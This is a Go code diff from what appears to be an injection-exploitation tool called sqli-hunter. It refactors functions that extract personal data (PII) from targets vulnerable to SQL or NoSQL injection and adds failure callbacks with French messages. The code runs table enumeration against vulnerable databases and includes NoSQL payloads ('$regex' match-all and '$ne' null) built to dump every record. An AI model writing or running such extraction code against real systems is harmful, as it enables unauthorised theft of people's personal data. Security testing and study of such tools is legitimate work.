@@ -7,20 +7,30 @@ import (
 	"github.com/sqli-hunter/sqli-hunter/internal/models"
 )
 
-func (e *Extractor) runPII(ctx context.Context, target models.ScanTarget, param string, vulnType models.VulnType, dbms, findingURL string) []models.ExtractedData {
-	if vulnType == models.NoSQL {
-		return e.runPIINoSQL(ctx, target, param, vulnType, findingURL)
+func (e *Extractor) runPIIFromFinding(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
+	if finding.VulnType == models.NoSQL {
+		return e.runPIINoSQL(ctx, target, finding)
 	}
-	return e.runPIISQL(ctx, target, param, vulnType, dbms, findingURL)
+	return e.runPIISQL(ctx, target, finding)
 }
 
-func (e *Extractor) runPIISQL(ctx context.Context, target models.ScanTarget, param string, vulnType models.VulnType, dbms, findingURL string) []models.ExtractedData {
-	dbms = normalizeDBMS(dbms)
+func (e *Extractor) fireDumpFail(finding models.Finding, reason string) {
+	if e.onDumpFail != nil {
+		e.onDumpFail(finding, reason)
+	}
+}
+
+func (e *Extractor) runPIISQL(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
+	param := finding.Parameter
+	vulnType := finding.VulnType
+	dbms := normalizeDBMS(finding.DBMS)
+	findingURL := finding.URL
 
 	// Phase 1 — tables
 	tablesJob := BuildTablesJob(dbms, vulnType)
 	tablesRaw := e.execJob(ctx, target, param, tablesJob)
 	if tablesRaw == "" {
+		e.fireDumpFail(finding, "énumération tables échouée")
 		return nil
 	}
 
@@ -87,10 +97,16 @@ func (e *Extractor) runPIISQL(ctx context.Context, target models.ScanTarget, par
 		}
 	}
 
+	if len(results) == 0 {
+		e.fireDumpFail(finding, "aucune donnée PII extraite")
+	}
 	return results
 }
 
-func (e *Extractor) runPIINoSQL(ctx context.Context, target models.ScanTarget, param string, vulnType models.VulnType, findingURL string) []models.ExtractedData {
+func (e *Extractor) runPIINoSQL(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
+	param := finding.Parameter
+	vulnType := finding.VulnType
+	findingURL := finding.URL
 	jobs := []ExtractionJob{
 		{DataType: models.DataDump, Payload: `{"$regex":".*"}`, Method: "nosql"},
 		{DataType: models.DataDump, Payload: `{"$ne":null}`, Method: "nosql"},
@@ -135,6 +151,9 @@ func (e *Extractor) runPIINoSQL(ctx context.Context, target models.ScanTarget, p
 		}
 	}
 
+	if len(results) == 0 {
+		e.fireDumpFail(finding, "aucune donnée PII extraite (nosql)")
+	}
 	return results
 }
 
